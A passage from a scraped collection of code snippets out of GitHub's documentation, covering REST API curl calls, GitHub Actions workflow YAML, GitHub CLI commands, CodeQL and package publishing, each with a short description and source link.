https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/app/installations\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer YOUR_JWT\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Disabling Automatic Runner Updates\nDESCRIPTION: Disables automatic software updates for a self-hosted runner using the `config.sh` script with the `--disableupdate` flag. Requires manual updates of the runner software within 30 days of a new release. Requires access to the runner configuration script.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --url https://github.com/YOUR-ORGANIZATION --token EXAMPLE-TOKEN --disableupdate\n```\n\n----------------------------------------\n\nTITLE: Configuring workflow to ignore Dependabot branches - YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to run on all pushes except those originating from Dependabot branches. It also configures the workflow to run on all pull requests. This approach avoids permission issues when Dependabot initiates workflow runs by excluding Dependabot branches from push-triggered actions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/resource-not-accessible.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches-ignore:\n      - 'dependabot/**'\n  pull_request:\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: This shell script updates the GitHub Actions Importer CLI to the latest version from GitHub Container Registry. It assumes the `gh actions-importer` command is available and connected to the container registry. The command pulls the newest container image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Defining a Function Signature for Copilot Suggestion in Swift\nDESCRIPTION: This code snippet shows a Swift function signature that triggers a code completion suggestion from GitHub Copilot. The function signature `func calculateDaysBetweenDates(` is typed in a Swift file, and GitHub Copilot suggests the function body.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_14\n\nLANGUAGE: Swift\nCODE:\n```\nfunc calculateDaysBetweenDates(\n```\n\n----------------------------------------\n\nTITLE: Running a Workflow with GitHub CLI\nDESCRIPTION: This snippet demonstrates how to trigger a workflow using the GitHub CLI (`gh`).  It shows the basic command to run a workflow, including how to specify the workflow by name, ID, or filename. It also covers how to pass input parameters, including reading from a file and using JSON.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/manually-running-a-workflow.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh workflow run WORKFLOW\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh workflow run greet.yml -f name=mona -f greeting=hello -F data=@myfile.txt\n```\n\nLANGUAGE: shell\nCODE:\n```\necho '{\"name\":\"mona\", \"greeting\":\"hello\"}' | gh workflow run greet.yml --json\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh workflow run WORKFLOW --ref BRANCH\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh run watch\n```\n\n----------------------------------------\n\nTITLE: Writing JavaScript Action Code\nDESCRIPTION: This JavaScript code retrieves the `who-to-greet` input, prints a greeting to the console, sets the current time as an output, and prints the webhook event payload. It utilizes the `@actions/core` and `@actions/github` packages.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst core = require('@actions/core');\nconst github = require('@actions/github');\n\ntry {\n  // `who-to-greet` input defined in action metadata file\n  const nameToGreet = core.getInput('who-to-greet');\n  console.log(`Hello ${nameToGreet}!`);\n  const time = (new Date()).toTimeString();\n  core.setOutput(\"time\", time);\n  // Get the JSON webhook payload for the event that triggered the workflow\n  const payload = JSON.stringify(github.context.payload, undefined, 2)\n  console.log(`The event payload: ${payload}`);\n} catch (error) {\n  core.setFailed(error.message);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Prometheus server to scrape GHES metrics - YAML\nDESCRIPTION: This snippet provides an example configuration for the `prometheus.yaml` file on an external Prometheus server to scrape metrics from a GitHub Enterprise Server instance. It defines a `job_name`, sets a `scrape_interval` of 10 seconds, and specifies the target URL for the metrics endpoint, `http(s)://HOSTNAME:9103/metrics`. The `HOSTNAME` needs to be replaced with the actual hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/exporting-and-scraping-prometheus-metrics.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\n- job_name: \"ghes-prom-agent\"\n  scrape_interval: 10s\n  static_configs:\n    - targets: [\"http(s)://HOSTNAME:9103/metrics\"]\n```\n\n----------------------------------------\n\nTITLE: Inheriting Secrets for a Workflow in YAML\nDESCRIPTION: This YAML snippet shows how to call a reusable workflow and inherit secrets implicitly. The `inherit` keyword is used with the `secrets` keyword, which allows the called workflow to access the secrets defined in the calling workflow's organization or enterprise.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/pass-inputs-to-reusable-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  call-workflow-passing-data:\n    uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets: inherit\n```\n\n----------------------------------------\n\nTITLE: Specifying Action by Tag or SHA\nDESCRIPTION: Demonstrates how to specify an action using a tag or SHA within a workflow. This allows you to target specific versions of an action for use in your workflow. The syntax `OWNER/REPOSITORY@TAG-OR-SHA` is used.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/allow-specific-actions-intro.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nactions/javascript-action@v1.0.1\n```\n\nLANGUAGE: text\nCODE:\n```\nactions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f\n```\n\n----------------------------------------\n\nTITLE: Scheduling Code Scanning in YAML\nDESCRIPTION: This snippet demonstrates how to schedule code scanning to run automatically at a specific time using the `cron` expression. The example shows a workflow that runs every Monday at 14:20 UTC.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  push:\n    branches: [main, protected]\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: '20 14 * * 1'\n```\n\n----------------------------------------\n\nTITLE: Create Amazon ECR Repository - AWS CLI\nDESCRIPTION: This command creates an Amazon ECR repository using the AWS CLI. Replace `MY_ECR_REPOSITORY` with the desired repository name and `MY_AWS_REGION` with the appropriate AWS region.  It requires the AWS CLI to be installed and configured with appropriate permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-amazon-elastic-container-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naws ecr create-repository \\\n    --repository-name MY_ECR_REPOSITORY \\\n    --region MY_AWS_REGION\n```\n\n----------------------------------------\n\nTITLE: Running Commands with PowerShell Core (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to run a command using PowerShell Core (`pwsh`) in a GitHub Actions workflow. It uses the `shell` keyword to explicitly specify `pwsh` as the shell interpreter and shows the PowerShell syntax for accessing environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the path\n    shell: pwsh\n    run: echo ${env:PATH}\n```\n\n----------------------------------------\n\nTITLE: Verifying SSH Connection to GitHub\nDESCRIPTION: This snippet verifies the SSH connection to GitHub by attempting to connect to the specified domain. It's crucial to ensure you're connecting to the correct server to avoid permission denied errors.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh -vT git@{% data variables.product.product_url %}\n```\n\n----------------------------------------\n\nTITLE: Defining Job Permissions in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet configures a job named 'stale' with specific permissions for the GITHUB_TOKEN. It grants write access to 'issues' and 'pull-requests', effectively limiting the scope of the token's capabilities within this job. The job runs on the latest Ubuntu environment and uses a reusable action for handling stale issues/pull requests.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/setting-permissions-specific-jobs-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  stale:\n    runs-on: ubuntu-latest\n\n    permissions:\n      issues: write\n      pull-requests: write\n\n    steps:\n      - uses: {% data reusables.actions.action-stale %}\n```\n\n----------------------------------------\n\nTITLE: Setting an error message in Bash\nDESCRIPTION: This snippet demonstrates how to set an error message using the `error` workflow command in Bash, including file, line, column, endColumn, and title parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\necho \"::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Building a Docker image\nDESCRIPTION: This command builds a Docker image from a Dockerfile, tagging it with a name and version for publishing to the GitHub Packages registry. It requires the OWNER, REPOSITORY, IMAGE_NAME, VERSION and PATH to be specified.  This is for github.com.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ndocker build -t docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION PATH\n```\n\n----------------------------------------\n\nTITLE: Setting environment secret via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set a secret for a specific environment using the GitHub CLI. The `--env` flag specifies the target environment. Requires GitHub CLI installed and authenticated.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set --env ENV_NAME SECRET_NAME\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: System-Generated GUIDs\nDESCRIPTION: This JSON template customizes the `sub` claim to include either `repository_id` or `repository_owner_id`. This allows the use of system-generated GUIDs for predictable claims, even when entities are renamed. The cloud provider OIDC configuration must require a matching claim.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n     \"include_claim_keys\": [\n         \"repository_id\"\n     ]\n  }\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner_id\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: ConfigMap for Runner Container Hook - YAML\nDESCRIPTION: This YAML defines a ConfigMap used to configure runner container hooks for setting security contexts. It targets the job container (`$job`) and sets the `runAsUser` to 1000. This allows customization of the container's security settings. This example demonstrates how hook extensions allow setting the PodSpec of the created pod.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_29\n\nLANGUAGE: YAML\nCODE:\n```\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: hook-extension\n  namespace: arc-runners\ndata:\n  content: |\n    metadata:\n      annotations:\n        example: \"extension\"\n    spec:\n      containers:\n        - name: \"$job\" # Target the job container\n          securityContext:\n            runAsUser: 1000\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_COMMIT_SHORT_SHA to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_COMMIT_SHORT_SHA` to the GitHub Actions equivalent `${{ github.sha }}`.  As GitHub Actions does not provide short SHA directly, full SHA is used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_21\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.sha }}\n```\n\n----------------------------------------\n\nTITLE: Creating issue with a template via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue with a pre-defined template using the `template` query parameter. The `template` parameter specifies the path to the issue template file (`issue_template.md`).\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_8\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?template=issue_template.md\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Repository Starring\nDESCRIPTION: This YAML snippet shows how to trigger a workflow when a repository is starred using the `watch` event with the `started` activity type. This is triggered when someone stars the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_50\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  watch:\n    types: [started]\n```\n\n----------------------------------------\n\nTITLE: Setting a notice message in Bash\nDESCRIPTION: This snippet demonstrates how to set a notice message using the `notice` workflow command in Bash. Notice messages appear in the workflow log and can include file, line, and column information for annotation.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\necho \"::notice file=app.js,line=1,col=5,endColumn=7::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Specifying CMD in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet shows how to explicitly specify the Command shell (cmd.exe) in a GitHub Actions workflow. It uses the `shell: cmd` option within the `run` step to override the default PowerShell shell on Windows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  run_command:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in PowerShell on Windows by default\"\n      - run: echo \"This step runs in CMD on Windows explicitly\"\n        shell: cmd\n```\n\n----------------------------------------\n\nTITLE: Referencing a Commit SHA in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet shows how to reference a specific commit SHA for an action in a GitHub Actions workflow. This provides the most reliable way to ensure the action's behavior remains constant, but users will not receive updates made after that commit.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/about-custom-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - uses: actions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f\n```\n\n----------------------------------------\n\nTITLE: Configuring Kotlin DSL for multiple packages\nDESCRIPTION: This snippet illustrates how to configure Kotlin DSL for publishing multiple packages to GitHub Packages within the same repository. It configures the PublishingExtension and specifies the repository URL and credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nplugins {\n    `maven-publish` apply false\n}\nsubprojects {\n    apply(plugin = \"maven-publish\")\n    configure<PublishingExtension> {\n        repositories {\n            maven {\n                name = \"GitHubPackages\"\n                url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n                credentials {\n                    username = project.findProperty(\"gpr.user\") as String? ?: System.getenv(\"USERNAME\")\n                    password = project.findProperty(\"gpr.key\") as String? ?: System.getenv(\"TOKEN\")\n                }\n            }\n        }\n        publications {\n            register<MavenPublication>(\"gpr\") {\n                from(components[\"java\"])\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Multiple CodeQL Databases\nDESCRIPTION: This command analyzes multiple CodeQL databases for a single commit, requiring the specification of a SARIF category for each set of results to distinguish between languages and prevent overwriting results upon upload to GitHub. The database, format, sarif-category, and output parameters must be specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database analyze <database> --format=<format> \\\n    --sarif-category=<language-specifier> --output=<output> \\\n    <packs,queries>\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Image from Private Registry\nDESCRIPTION: This snippet configures the runner image to be pulled from a private container registry. It sets the `template.spec.containers.image`, `template.spec.containers.imagePullPolicy`, and `template.spec.imagePullSecrets` properties in the runner's `values.yaml` file. A Kubernetes secret with registry credentials (`<registry-secret-name>`) must exist.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\ntemplate:\n  spec:\n    containers:\n      - name: runner\n        image: \"custom-registry.io/actions-runner:latest\"\n        imagePullPolicy: Always\n        command: [\"/home/runner/run.sh\"]\n    imagePullSecrets:\n      - name: <registry-secret-name>\n```\n\n----------------------------------------\n\nTITLE: Installing dependencies in GitHub Actions workflow using 'run'\nDESCRIPTION: This snippet shows how to use the `run` keyword in a GitHub Actions workflow to execute shell commands on the runner, specifically installing the `bats` package globally using `npm`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/adding-scripts-to-your-workflow.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm install -g bats\n```\n\n----------------------------------------\n\nTITLE: Creating a Codespace using GitHub CLI\nDESCRIPTION: This command creates a new codespace for a specified repository and branch. The `-r` flag specifies the repository (OWNER/REPO_NAME), and the optional `-b` flag specifies the branch. If the branch is not specified, the default branch is used. This command requires the GitHub CLI to be authenticated and configured to access the specified repository.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace create -r OWNER/REPO_NAME [-b BRANCH]\n```\n\n----------------------------------------\n\nTITLE: Cluster Replication Teardown (ghe-cluster-repl-teardown)\nDESCRIPTION: This utility disables replication to replica nodes for a cluster in a high availability configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_36\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-repl-teardown\n```\n\n----------------------------------------\n\nTITLE: Labeling Dependabot Pull Requests with GitHub Actions (YAML)\nDESCRIPTION: This workflow automatically labels Dependabot pull requests based on the dependency type. It fetches metadata using the `dependabot/fetch-metadata` action and then adds a label if the dependency is a production dependency. The workflow requires `pull-requests: write` and `issues: write` permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/automating-dependabot-with-github-actions.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: Dependabot auto-label\non: pull_request\n\npermissions:\n  pull-requests: write\n  issues: write\n\njobs:\n  dependabot:\n    runs-on: ubuntu-latest\n    if: github.event.pull_request.user.login == 'dependabot[bot]' && github.repository == 'owner/my_repo'\n    steps:\n      - name: Dependabot metadata\n        id: metadata\n        uses: dependabot/fetch-metadata@d7267f607e9d3fb96fc2fbe83e0af444713e90b7\n        with:\n          github-token: \"${{ secrets.GITHUB_TOKEN }}\"\n      - name: Add a label for all production dependencies\n        if: steps.metadata.outputs.dependency-type == 'direct:production'\n        run: gh pr edit \"$PR_URL\" --add-label \"production\"\n        env:\n          PR_URL: ${{github.event.pull_request.html_url}}\n```\n\n----------------------------------------\n\nTITLE: Deleting a User via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP DELETE request used to hard-deprovision a user in GitHub Enterprise using the SCIM API. Hard-deprovisioning completely deletes a user, obfuscating their login and email, and deleting all SCIM attributes, emails, SSH keys, PATs, and GPG keys.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nDELETE /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Users/{scim_user_id}\n```\n\n----------------------------------------\n\nTITLE: Defining PostgreSQL Service Container (Container Jobs) - YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that includes a PostgreSQL service container. The `container-job` uses the `node:20-bookworm-slim` Docker image, and the `postgres` service uses the `postgres` image from Docker Hub. It sets the `POSTGRES_PASSWORD` environment variable and defines health check options to ensure the PostgreSQL service is ready before the job proceeds.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: PostgreSQL service example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data.\n        run: node client.js\n        # Environment variables used by the `client.js` script to create a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Checking out a Branch with Git Checkout\nDESCRIPTION: This snippet shows how to switch to a specific branch in the cloned repository using the `git checkout` command.  The example uses `TEST-BRANCH` as the branch name to switch to. This is crucial for working on the specific branch associated with the pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/committing-changes-to-a-pull-request-branch-created-from-a-fork.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit checkout TEST-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Switching Remote URL from SSH to HTTPS\nDESCRIPTION: This snippet demonstrates how to change a remote's URL from SSH to HTTPS using the `git remote set-url` command. The `git remote -v` command is used to verify the change.  It assumes the user knows the correct HTTPS URL for the repository. The process includes listing remotes, changing the URL, and verifying the change.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote set-url origin https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# Verify new remote URL\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: package.json Configuration for GitHub Packages\nDESCRIPTION: This snippet shows a sample `package.json` file that links the package to a specific repository on GitHub Packages using the `repository` key.  It demonstrates how to publish the package to a different repository than the one where the code resides.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"@octocat/my-package\",\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/octocat/my-other-repo.git\"\n  }\n\n```\n\n----------------------------------------\n\nTITLE: Getting GitHub Issues with curl\nDESCRIPTION: This code snippet demonstrates how to retrieve a list of issues from a GitHub repository using `curl`. It includes setting the `Accept` and `Authorization` headers, and specifies the repository and pagination. The `--include` flag displays the response headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n--url \"https://api.github.com/repos/{% ifversion ghes %}REPO-OWNER/REPO-NAME{% else %}octocat/Spoon-Knife{% endif %}/issues?per_page=2\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer YOUR-TOKEN\" \\\n--include\n```\n\n----------------------------------------\n\nTITLE: Creating co-authored commit - Multiple Authors in Shell\nDESCRIPTION: This code snippet shows how to add multiple co-authors to a commit message using the `Co-authored-by` trailer format in the shell. Each co-author should have their own line with their name and email. No blank lines are allowed between co-author lines.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/creating-a-commit-with-multiple-authors.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Refactor usability tests.\n>\n> Co-authored-by: NAME <NAME@EXAMPLE.COM>\n> Co-authored-by: ANOTHER-NAME <ANOTHER-NAME@EXAMPLE.COM>\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Steps (Container Jobs) - YAML\nDESCRIPTION: This YAML snippet configures the steps within a GitHub Actions workflow job. It includes steps to check out the repository code, install dependencies using `npm ci`, and connect to the PostgreSQL service. The `Connect to PostgreSQL` step executes a `node client.js` script and sets environment variables (`POSTGRES_HOST` and `POSTGRES_PORT`) required for the script to connect to the PostgreSQL service container.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data.\n    run: node client.js\n    # Environment variable used by the `client.js` script to create\n    # a new PostgreSQL client.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: postgres\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub issue via GraphQL API\nDESCRIPTION: This GraphQL mutation creates a new issue in a specified GitHub repository. It requires the repository's node ID, the issue's title, and the issue's body as input.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/about-the-rest-api/comparing-githubs-rest-api-and-graphql-api.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nmutation {\n  createIssue(\n    input: {\n      repositoryId: \"MDEwOlJlcG9zaXRvcnkxMzAwMTky\"\n      title: \"Bug with feature X\"\n      body: \"If you do A, then B happens\"}\n  ) {\n    issue {\n      number\n      url\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Autobuild Process for Go\nDESCRIPTION: The autobuild process for Go attempts to automatically detect and install dependencies before extracting Go files.  It tries `make`, `ninja`, `./build`, or `./build.sh`, then looks for `go.mod`, `Gopkg.toml` or `glide.yaml` to install dependencies. If all else fails, it rearranges the directory structure and uses `go get`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_9\n\n\n\n----------------------------------------\n\nTITLE: List public events via curl with query parameters\nDESCRIPTION: This snippet showcases how to use query parameters with `curl` to customize the results from the GitHub REST API's \"List public events\" endpoint. It uses `per_page` and `page` to limit the results and specify the page number. It also includes headers for accepting JSON and specifying the API version.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/events?per_page=2&page=1\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"X-GitHub-Api-Version: 2022-11-28\" \\\n  https://api.github.com/events\n```\n\n----------------------------------------\n\nTITLE: Setting GITHUB_TOKEN Permissions to Write-All in YAML\nDESCRIPTION: This YAML snippet demonstrates how to grant `write` access to all available permissions for the GITHUB_TOKEN.  This should be used with caution as it provides broad access.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/github-token-available-permissions.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\npermissions: write-all\n```\n\n----------------------------------------\n\nTITLE: Downloading a CodeQL Pack\nDESCRIPTION: This snippet demonstrates how to download a CodeQL pack using the `codeql pack download` command.  It includes the scope, pack name, and an optional version number.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql pack download <scope>/<pack>@x.x.x\n```\n\n----------------------------------------\n\nTITLE: Masking a string in PowerShell\nDESCRIPTION: 